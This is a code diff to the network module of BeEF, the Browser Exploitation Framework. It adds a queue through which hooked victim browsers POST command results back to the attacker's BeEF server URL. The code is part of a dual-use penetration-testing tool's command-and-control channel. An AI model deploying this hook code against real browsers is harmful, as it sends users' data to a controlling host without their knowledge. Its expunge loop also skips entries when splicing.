@@ -6,7 +6,8 @@
 beef.net = {
 	
 	beef_url: "<%= @beef_url %>",
-	beef_hook: "<%= @beef_hook %>",	
+	beef_hook: "<%= @beef_hook %>",
+	beef_queue: [],
 	
 	/**
 	 * Gets an object that can be used for ajax requests.
@@ -118,6 +119,19 @@ beef.net = {
 	},
 	
 	/**
+	 * Queues a communication request to be sent the next time the hook updates
+	 * @param: {String} The url to return the results to.
+	 * @param: {Integer} The command id that launched the command module.
+	 * @param: {String/Object} The results to send back.
+	 * @param: {Function} the handler to callback once the http request has been performed.
+	 * 
+	 * @example: beef.net.queue("/commandmodule/prompt_dialog.js", 19, "answer=zombie_answer");
+	 */
+	queue: function(commandmodule, command_id, results, handler) {
+		this.beef_queue.push({'command':commandmodule, 'cid':command_id, 'results':results, 'handler':handler});
+	},
+	
+	/**
 	 * Sends results back to the BeEF framework.
 	 * @param: {String} The url to return the results to.
 	 * @param: {Integer} The command id that launched the command module.
@@ -127,19 +141,44 @@ beef.net = {
 	 * @example: beef.net.sendback("/commandmodule/prompt_dialog.js", 19, "answer=zombie_answer");
 	 */
 	sendback: function(commandmodule, command_id, results, handler) {
-		if(typeof results == 'object') {
-			s_results = '';
-			
-			for(key in results) {
-				s_results += key + '=' + escape(results[key].toString()) + '&';
+		beef.net.queue(commandmodule, command_id, results, handler);
+		beef.net.flush_queue();
+	},
+	
+	/**
+	 * Sends results back to the BeEF framework.
+	 */
+	flush_queue: function() {
+		for (var i in this.beef_queue)
+		{
+			var results = this.beef_queue[i]['results'];
+			if(typeof results == 'object') {
+				s_results = '';
+				for(key in results) {
+					s_results += key + '=' + escape(results[key].toString()) + '&';
+				}
+				results = s_results;
 			}
 			
-			results = s_results;
+			if(typeof results == 'string' && typeof this.beef_queue[i]['cid'] == 'number') {
+				results += '&command_id='+this.beef_queue[i]['cid'];
+				this.request(this.beef_url + this.beef_queue[i]['command'], 'POST', this.beef_queue[i]['handler'], results);
+			}
+			this.beef_queue[i]['expunge'] = true;
 		}
-		
-		if(typeof results == 'string' && typeof command_id == 'number') {
-			results += '&command_id='+command_id;
-			this.request(this.beef_url + commandmodule, 'POST', handler, results);
+		beef.net.expunge_queue();
+	},
+	
+	/**
+	 * Cleans queue of commands that have been executed
+	 */
+	expunge_queue: function() {
+		for (var i = 0; i < this.beef_queue.length; i++)
+		{
+			if (this.beef_queue[i] && this.beef_queue[i]['expunge'])
+			{
+				this.beef_queue.splice(i,1);
+			}
 		}
 	}
 	
